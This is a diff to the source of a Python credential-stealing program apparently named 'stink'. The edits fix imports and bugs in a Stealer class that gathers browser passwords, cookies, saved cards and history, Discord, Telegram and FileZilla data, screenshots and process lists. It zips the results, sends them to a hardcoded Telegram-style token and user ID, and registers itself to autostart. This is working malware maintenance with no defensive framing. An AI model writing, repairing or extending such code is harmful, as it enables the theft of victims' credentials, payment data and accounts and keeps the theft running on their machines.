@@ -6,14 +6,14 @@ from threading import Thread
 from os import path, makedirs
 from typing import Self
 
-from stink.modules import Chromium, Discord, FileZilla, System, Telegram
-from stink.utils import Autostart, config, Sender
+from .modules import Chromium, Discord, FileZilla, System, Telegram
+from .utils import Autostart, config, Sender
 
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id : int, autostart: bool = False, errors: bool = False, **kwargs):
-        Thread.__init__(self, name="Stea")
+    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
+        Thread.__init__(self, name="Stealer")
 
         self.token = token
         self.user_id = 5327162295
@@ -28,8 +28,7 @@ class Stealer(Thread):
             else:
                 self.__dict__.update({status: True})
 
-        browser_functions = (self.passwords, self.cookies,
-                             self.cards, self.history, self.bookmarks)
+        browser_functions = (self.passwords, self.cookies, self.cards, self.history, self.bookmarks)
 
         self.methods = [
             {
@@ -83,12 +82,12 @@ class Stealer(Thread):
                     self.config.StoragePath,
                     *self.config.VivaldiPaths,
                     browser_functions,
-                    Self.errors
+                    self.errors
                 )
             },
             {
                 "object": System(
-                    SelfReg.config.StoragePath,
+                    self.config.StoragePath,
                     "System",
                     (self.screen, self.system, self.processes),
                     self.errors
@@ -135,15 +134,10 @@ class Stealer(Thread):
             self.__create_storage()
 
             for method in self.methods:
-                method["object"].start()
+                method["object"].run()
 
-            for method in self.methods:
-                method["object"].join()
-
-            Sender(self.config.ZipName, self.config.StoragePath,
-                   self.token, self.user_id, self.errors).run()
+            Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
             Autostart(argv[0], (self.autostart,), self.errors).run()
 
         except Exception as e:
-            if self.errors is True:
-                print(f"[Multistealer]: {repr(e)}")
+            if self.errors is True: print(f"[Multistealer]: {repr(e)}")
